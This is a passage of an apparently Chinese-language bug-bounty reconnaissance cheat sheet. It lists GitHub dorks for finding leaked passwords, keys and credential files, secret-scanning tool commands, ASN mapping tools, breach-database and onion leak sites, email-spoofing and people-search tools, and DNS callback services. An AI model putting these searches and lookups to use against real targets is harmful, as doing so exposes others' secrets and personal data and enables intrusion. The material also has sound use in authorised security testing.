+19. “Set-Cookie: phpMyAdmin”
+20. “Set-Cookie: lang=&quot;
+21. “Set-Cookie: PHPSESSID&quot;
+22. “Set-Cookie: webvpn”
+23. “Set-Cookie:webvpnlogin=1&quot;
+24. “Set-Cookie:webvpnLang=en”
+25. “Set-Cookie: mongo-express=&quot;
+26. “Set-Cookie: user_id=&quot;
+27. “Set-Cookie: phpMyAdmin=&quot;
+28. “Set-Cookie: _gitlab_session”
+29. “X-elastic-product: Elasticsearch”
+30. “x-drupal-cache”
+31. “access-control-allow-origin”
+32. “WWW-Authenticate”
+33. “X-Magento-Cache-Debug”
+34. “kbn-name: kibana”
+</code></pre>
+<h3>github语法</h3>
+<pre><code class="language-github基本">api_key
+“api keys”
+authorization_bearer:
+oauth
+auth
+authentication
+client_secret
+api_token:
+“api token”
+client_id
+password
+user_password
+user_pass
+passcode
+client_secret
+secret
+password hash
+OTP
+user auth
+#Some of the mine which I use generally
+
+remove password
+root
+admin
+log
+trash
+token
+FTP_PORT
+FTP_PASSWORD
+DB_DATABASE=
+DB_HOST=
+DB_PORT=
+DB_PASSWORD=
+DB_PW=
+DB_USER=
+number
+</code></pre>
+<pre><code class="language-language">like: language:shell username
+language:sql username
+language:python ftp
+language:bash ftp
+</code></pre>
+<pre><code class="language-url结合google">ste:xxyz.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:txt | ext:html | ext:php | ext:xls`)
+</code></pre>
+<pre><code class="language-something">dotfiles
+filename:sftp-config.json password
+filename:.s3cfg
+filename:config.php dbpasswd
+filename:.bashrc password
+filename:.esmtprc password
+filename:.netrc password
+filename:_netrc password
+filename:.env MAIL_HOST=smtp.gmail.com
+filename:prod.exs NOT prod.secret.exs
+filename:.npmrc _auth
+filename:WebServers.xml
+filename:sftp-config.json
+filename:.esmtprc password
+filename:passwd path:etc
+filename:prod.secret.exs
+filename:sftp-config.json
+filename:proftpdpasswd
+filename:travis.yml
+filename:vim_settings.xml
+filename:sftp.json path:.vscode
+filename:secrets.yml password
+extension:sql mysql dump
+extension:sql mysql dump
+extension:sql mysql dump password
+extension:pem private
+extension:ppk private
+
+
+自动化：
+手动方式最适合从 Github 中查找敏感信息。但如果你想自动化这一过程，我建议你使用 GitDorker。在猎取 GitHub 的过程中，我有时也会使用这个工具。虽然它的速度有点慢，因为为了防止速率限制，Gitdocker 每分钟会发送 30 个请求。但它提供的错误结果比其他工具要少得多。
+
+此外，你还可以使用这个工具，它给我带来了惊人的效果
+
+$ git clone https://github.com/obheda12/GitDorker
+$ python3 GitDorker.py -tf ~/Tools/.github_tokens -q united.com -p -ri -d Dorks/medium_dorks.txt
+
+呆子名单
+&quot;.mlab.com password&quot;
+&quot;access_key&quot;
+&quot;access_token&quot;
+&quot;amazonaws&quot;
+&quot;api.googlemaps AIza&quot;
+&quot;api_key&quot;
+&quot;api_secret&quot;
+&quot;apidocs&quot;
+&quot;apikey&quot;
+&quot;apiSecret&quot;
+&quot;app_key&quot;
+&quot;app_secret&quot;
+&quot;appkey&quot;
+&quot;appkeysecret&quot;
+&quot;application_key&quot;
+&quot;appsecret&quot;
+&quot;appspot&quot;
+&quot;auth&quot;
+&quot;auth_token&quot;
+&quot;authorizationToken&quot;
+&quot;aws_access&quot;
+&quot;aws_access_key_id&quot;
+&quot;aws_key&quot;
+&quot;aws_secret&quot;
+&quot;aws_token&quot;
+&quot;AWSSecretKey&quot;
+&quot;bashrc password&quot;
+&quot;bucket_password&quot;
+&quot;client_secret&quot;
+&quot;cloudfront&quot;
+&quot;codecov_token&quot;
+&quot;config&quot;
+&quot;conn.login&quot;
+&quot;connectionstring&quot;
+&quot;consumer_key&quot;
+&quot;credentials&quot;
+&quot;database_password&quot;
+&quot;db_password&quot;
+&quot;db_username&quot;
+&quot;dbpasswd&quot;
+&quot;dbpassword&quot;
+&quot;dbuser&quot;
+&quot;dot-files&quot;
+&quot;dotfiles&quot;
+&quot;encryption_key&quot;
+&quot;fabricApiSecret&quot;
+&quot;fb_secret&quot;
+&quot;firebase&quot;
+&quot;ftp&quot;
+&quot;gh_token&quot;
+&quot;github_key&quot;
+&quot;github_token&quot;
+&quot;gitlab&quot;
+&quot;gmail_password&quot;
+&quot;gmail_username&quot;
+&quot;herokuapp&quot;
+&quot;internal&quot;
+&quot;irc_pass&quot;
+&quot;JEKYLL_GITHUB_TOKEN&quot;
+&quot;key&quot;
+&quot;keyPassword&quot;
+&quot;ldap_password&quot;
+&quot;ldap_username&quot;
+&quot;login&quot;
+&quot;mailchimp&quot;
+&quot;mailgun&quot;
+&quot;master_key&quot;
+&quot;mydotfiles&quot;
+&quot;mysql&quot;
+&quot;node_env&quot;
+&quot;npmrc _auth&quot;
+&quot;oauth_token&quot;
+&quot;pass&quot;
+&quot;passwd&quot;
+&quot;password&quot;
+&quot;passwords&quot;
+&quot;pem private&quot;
+&quot;preprod&quot;
+&quot;private_key&quot;
+&quot;prod&quot;
+&quot;pwd&quot;
+&quot;pwds&quot;
+&quot;rds.amazonaws.com password&quot;
+&quot;redis_password&quot;
+&quot;root_password&quot;
+&quot;secret&quot;
+&quot;secret.password&quot;
+&quot;secret_access_key&quot;
+&quot;secret_key&quot;
+&quot;db_password&quot;
+&quot;db_username&quot;
+&quot;dbpasswd&quot;
+&quot;dbpassword&quot;
+&quot;dbuser&quot;
+&quot;dot-files&quot;
+&quot;dotfiles&quot;
+&quot;encryption_key&quot;
+&quot;fabricApiSecret&quot;
+&quot;fb_secret&quot;
+&quot;firebase&quot;
+&quot;ftp&quot;
+&quot;gh_token&quot;
+&quot;github_key&quot;
+&quot;github_token&quot;
+&quot;gitlab&quot;
+&quot;gmail_password&quot;
+&quot;gmail_username&quot;
+&quot;herokuapp&quot;
+&quot;internal&quot;
+&quot;irc_pass&quot;
+&quot;JEKYLL_GITHUB_TOKEN&quot;
+&quot;key&quot;
+&quot;keyPassword&quot;
+&quot;ldap_password&quot;
+&quot;ldap_username&quot;
+&quot;login&quot;
+&quot;mailchimp&quot;
+&quot;mailgun&quot;
+&quot;master_key&quot;
+&quot;mydotfiles&quot;
+&quot;mysql&quot;
+&quot;node_env&quot;
+&quot;npmrc _auth&quot;
+&quot;oauth_token&quot;
+&quot;pass&quot;
+&quot;passwd&quot;
+&quot;password&quot;
+&quot;passwords&quot;
+&quot;pem private&quot;
+&quot;preprod&quot;
+&quot;private_key&quot;
+&quot;prod&quot;
+&quot;pwd&quot;
+&quot;pwds&quot;
+&quot;rds.amazonaws.com password&quot;
+&quot;redis_password&quot;
+&quot;root_password&quot;
+&quot;secret&quot;
+&quot;secret.password&quot;
+&quot;secret_access_key&quot;
+&quot;secret_key&quot;
+[WFClient] Password= extension:ica
+access_key
+bucket_password
+dbpassword
+dbuser
+extension:avastlic &quot;support.avast.com&quot;
+extension:bat
+extension:cfg
+extension:env
+extension:exs
+extension:ini
+extension:json api.forecast.io
+extension:json googleusercontent client_secret
+extension:json mongolab.com
+extension:pem
+extension:pem private
+extension:ppk
+extension:ppk private
+extension:properties
+extension:sh
+extension:sls
+extension:sql
+extension:sql mysql dump
+extension:sql mysql dump password
+extension:yaml mongolab.com
+extension:zsh
+filename:.bash_history
+filename:.bash_history DOMAIN-NAME
+filename:.bash_profile aws
+filename:.bashrc mailchimp
+filename:.bashrc password
+filename:.cshrc
+filename:.dockercfg auth
+filename:.env DB_USERNAME NOT homestead
+filename:.env MAIL_HOST=smtp.gmail.com
+filename:.esmtprc password
+filename:.ftpconfig
+filename:.git-credentials
+filename:.history
+filename:.htpasswd
+filename:.netrc password
+filename:.npmrc _auth
+filename:.pgpass
+filename:.remote-sync.json
+filename:.s3cfg
+filename:.sh_history
+filename:.tugboat NOT _tugboat
+filename:_netrc password
+filename:apikey
+filename:bash
+filename:bash_history
+filename:bash_profile
+filename:bashrc
+filename:beanstalkd.yml
+filename:CCCam.cfg
+filename:composer.json
+filename:config
+filename:config irc_pass
+filename:config.json auths
+filename:config.php dbpasswd
+filename:configuration.php JConfig password
+filename:connections
+filename:connections.xml
+filename:constants
+filename:credentials
+filename:credentials aws_access_key_id
+filename:cshrc
+filename:database
+filename:dbeaver-data-sources.xml
+filename:deployment-config.json
+filename:dhcpd.conf
+filename:dockercfg
+filename:environment
+filename:express.conf
+filename:express.conf path:.openshift
+filename:filezilla.xml
+filename:filezilla.xml Pass
+filename:git-credentials
+filename:gitconfig
+filename:global
+filename:history
+filename:htpasswd
+filename:hub oauth_token
+filename:id_dsa
+filename:id_rsa
+filename:id_rsa or filename:id_dsa
+filename:idea14.key
+filename:known_hosts
+filename:logins.json
+filename:makefile
+filename:master.key path:config
+filename:netrc
+filename:npmrc
+filename:pass
+filename:passwd path:etc
+filename:pgpass
+filename:prod.exs
+filename:prod.exs NOT prod.secret.exs
+filename:prod.secret.exs
+filename:proftpdpasswd
+filename:recentservers.xml
+filename:recentservers.xml Pass
+filename:robomongo.json
+filename:s3cfg
+filename:secrets.yml password
+filename:server.cfg
+filename:server.cfg rcon password
+filename:settings
+filename:settings.py SECRET_KEY
+filename:sftp-config.json
+filename:sftp-config.json password
+filename:sftp.json path:.vscode
+filename:shadow
+filename:shadow path:etc
+filename:spec
+filename:sshd_config
+filename:token
+filename:tugboat
+filename:ventrilo_srv.ini
+filename:WebServers.xml
+filename:wp-config
+filename:wp-config.php
+filename:zhrc
+HEROKU_API_KEY language:json
+HEROKU_API_KEY language:shell
+HOMEBREW_GITHUB_API_TOKEN language:shell
+jsforce extension:js conn.login
+language:yaml -filename:travis
+msg nickserv identify filename:config
+org:Target &quot;AWS_ACCESS_KEY_ID&quot;
+org:Target &quot;list_aws_accounts&quot;
+org:Target &quot;aws_access_key&quot;
+org:Target &quot;aws_secret_key&quot;
+org:Target &quot;bucket_name&quot;
+org:Target &quot;S3_ACCESS_KEY_ID&quot;
+org:Target &quot;S3_BUCKET&quot;
+org:Target &quot;S3_ENDPOINT&quot;
+org:Target &quot;S3_SECRET_ACCESS_KEY&quot;
+password
+path:sites databases password
+private -language:java
+PT_TOKEN language:bash
+redis_password
+root_password
+secret_access_key
+SECRET_KEY_BASE=
+shodan_api_key language:python
+WORDPRESS_DB_PASSWORD=
+xoxp OR xoxb OR xoxa
+s3.yml
+.exs
+beanstalkd.yml
+deploy.rake
+.sls
+— — — — — -BASH — — — — — — — — — —
+language:bash password
+language:bash pwd
+language:bash ftp
+language:bash dotfiles
+language:bash JDBC
+language:bash key-keys
+language:bash send_key-keys
+language:bash send,key-keys
+language:bash token
+language:bash user
+language:bash login-singin
+language:bash passkey-passkeys
+language:bash pass
+language:bash secret
+language:bash credentials
+language:bash config
+language:bash security_credentials
+language:bash connectionstring
+language:bash ssh2_auth_password
+— — — — — — — — — — — — — — — — — — -PYTHON — — — — — — — — —
+language:python password
+language:python pwd
+language:python ftp
+language:python dotfiles
+language:python JDBC
+language:python key-keys
+language:python send_key-keys
+language:python send,key-keys
+language:python token
+language:python user
+language:python login-singin
+language:python passkey-passkeys
+language:python pass
+language:python secret
+language:python credentials
+language:python config
+language:python security_credentials
+language:python connectionstring
+language:python ssh2_auth_password
+
+org:facebookresearch https://
+org:facebookresearch http://
+org:facebookresearch ldap
+org:facebookresearch ftp
+org:facebookresearch sftp
+org:facebookresearch host:
+org:facebookresearch login
+</code></pre>
+<h3>asncider-tools</h3>
+<p>asn/cidr</p>
+<pre><code class="language-asnmap">使用 ASN 信息快速映射组织网络范围的 Go CLI 和库
+# Company string name to CIDR
+# https://github.com/dhn/spk
+spk -json -s &quot;Google&quot;
+
+# Versatile tool with multiple input options and output formats
+# https://github.com/projectdiscovery/asnmap
+asnmap -i 1.3.3.7 -org GOOGLE -d facebook.com,twitter.com -a AS394161
+
+# https://github.com/nitefood/asn
+asn -n 8.8.8.8
+
+# https://github.com/j3ssie/metabigor
+echo &quot;company&quot; | metabigor net --org
+echo &quot;ASN1111&quot; | metabigor net --asn
+
+# https://github.com/yassineaboukir/Asnlookup
+python asnlookup.py -m -o &lt;Organization&gt;
+
+# https://github.com/harleo/asnip
+asnip -t domain.com -p
+
+# https://github.com/projectdiscovery/mapcidr
+echo 10.10.10.0/24 | mapcidr
+
+# https://github.com/eslam3kl/3klector
+python 3klector.py -t company
+
+# https://github.com/SpiderLabs/HostHunter
+python3 hosthunter.py targets.txt
+
+# Website (with API)
+https://asnlookup.com/
+</code></pre>
+<p>证书泄露</p>
+<pre><code># pwndb
+# https://github.com/davidtavarez/pwndb
+python3 pwndb.py --target asd@asd.com
+
+# Websites
+https://link-base.org/index.php
+http://xjypo5vzgmo7jca6b322dnqbsdnp3amd24ybx26x5nxbusccjkm4pwid.onion/
+http://pwndb2am4tzkvold.onion
+https://weleakinfo.to/
+https://www.dehashed.com/search?query=
+https://haveibeenpwned.com
+https://breachchecker.com
+https://vigilante.pw/
+https://leak.sx/
+https://intelx.io
+https://search.illicit.services/
+https://breachdirectory.org/
+
+breachdirectory.org + (hashes.com || md5decrypt.net || crackstation.net)# Nice combination
+
+# Check hashes with this tool
+https://github.com/jackrendor/jhf
+</code></pre>
+<p>电子邮件工具</p>
+<pre><code># https://github.com/SimplySecurity/SimplyEmail
+./SimplyEmail.py
+
+pip3 install mailspoof
+sudo mailspoof -d domain.com
+
+# Test email spoof
+https://emkei.cz/
+
+# Find emails in an org
+https://hunter.io
+https://snov.io/email-finder
+https://app.snov.io/domain-search
+https://hunter.io/
+
+# https://github.com/sham00n/buster
+buster -e target@example.com
+
+# https://github.com/m4ll0k/Infoga
+python infoga.py
+
+# https://github.com/martinvigo/email2phonenumber
+python email2phonenumber.py scrape -e target@email.com
+
+# https://github.com/jkakavas/creepy/
+
+# https://github.com/Josue87/EmailFinder
+emailfinder -d domain.com
+
+# https://github.com/laramies/theHarvester
+python3 theHarvester.py -d domain.com -b &quot;linkedin&quot;
+</code></pre>
+<p>GIT工具</p>
+<pre><code># https://github.com/obheda12/GitDorker
+python3 GitDorker.py -tf TOKENSFILE -q tesla.com -d dorks/DORKFILE -o target
+
+# https://github.com/dxa4481/truffleHog
+trufflehog https://github.com/Plazmaz/leaky-repo
+trufflehog --regex --entropy=False https://github.com/Plazmaz/leaky-repo
+
+# https://github.com/eth0izzle/shhgit
+shhgit --search-query AWS_ACCESS_KEY_ID=AKIA
+
+# https://github.com/d1vious/git-wild-hunt
+python git-wild-hunt.py -s &quot;extension:json filename:creds language:JSON&quot;
+
+# https://shhgit.darkport.co.uk/
+
+# GitLab (API token required)
+# https://github.com/codeEmitter/token-hunter
+./token-hunter.py -g 123456
+</code></pre>
+<p>社交媒体</p>
+<pre><code># Twitter
+# https://github.com/twintproject/twint
+twint -u username
+
+# Google account
+# https://github.com/mxrch/ghunt
+python hunt.py myemail@gmail.com
+
+# Instagram
+# https://github.com/th3unkn0n/osi.ig
+python3 main.py -u username
+
+# Public GDrive docs
+https://www.dedigger.com/#gsc.tab=0
+
+# Websites
+emailrep.io # Accounts registered by email
+tinfoleak.com # Twitter
+mostwantedhf.info # Skype
+searchmy.bio # Instagram
+search.carrot2.org # Results grouped by topic
+boardreader.com # forums
+searchcode.com # search by code in repositories
+swisscows.com # semantic search engine
+publicwww.com # search by source page code
+psbdmp.ws # search in pastebin
+kribrum.io # social-media search engine
+whatsmyname.app
+</code></pre>
+<p>元数据</p>
+<pre><code># https://github.com/Josue87/MetaFinder
+metafinder -d &quot;domain.com&quot; -l 10 -go -bi -ba -o united
+</code></pre>
+<h2>special-tools</h2>
+<pre><code>决议
+
+http://dnsbin.zhack.ca/ (DNS)
+http://pingb.in/ (DNS)
+https://www.mockbin.org/ (HTTP)
+
+通配符 DNS
+
+http://xip.io/
+
+10.0.0.1.xip.io
+www.10.0.0.1.xip.io
+mysite.10.0.0.1.xip.io
+foo.bar.10.0.0.1.xip.io
+
+
+http://nip.io/
+
+10.0.0.1.nip.io
+app.10.0.0.1.nip.io
+customer1.app.10.0.0.1.nip.io
+customer2.app.10.0.0.1.nip.io
+otherapp.10.0.0.1.nip.io
+
+
+others
+
+https://spyse.com/（全面侦察服务）
+https://dnsdumpster.com/ （DNS 和子域重组）
+反向 IP 查询（Domainmonitor）
+安全标头（安全报告、标头丢失）
+http://threatcrowd.org/ （WHOIS、DNS、电子邮件和子域重组）
+https://mxtoolbox.com/ （多种 DNS 相关重组工具）
+https://publicwww.com/ （源代码搜索引擎）
+http://ipv4info.com/ （在公司/组织拥有的 IP 块中查找域名）
+HackerTarget 工具（DNS 重组、网站查询和扫描工具）
+VirusTotal（WHOIS、DNS 和子域侦察）
+crt.sh（SSL 证书搜索）
+谷歌 CT（SSL 证书透明度搜索）
+PenTest 工具（Google ）
+Wayback Machine（查找过去在该域名上托管的内容）
+查找子域（使用域或关键字查找子域）
+</code></pre>
+<h2>graphql-api</h2>
+<p>graph是api中一种查询语言，可以用来查询和操作数据，是一种强类型的语言，可以用来描述数据的结构和操作数据的方式，是一种类似于json的语言，但是比json更加强大，可以用来描述数据的结构和操作数据的方式。
+<a href="https://xz.aliyun.com/t/14913?time__1311=GqAh0KAKDKYIK0y49DyDIgQDRlUGCYbfAeD">【翻译】GraphQL API 漏洞的常见攻击方法总结</a></p>
+<p><img src="https://pic1.imgdb.cn/item/6785ca76d0e0a243d4f40e37.gif" alt=""></p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
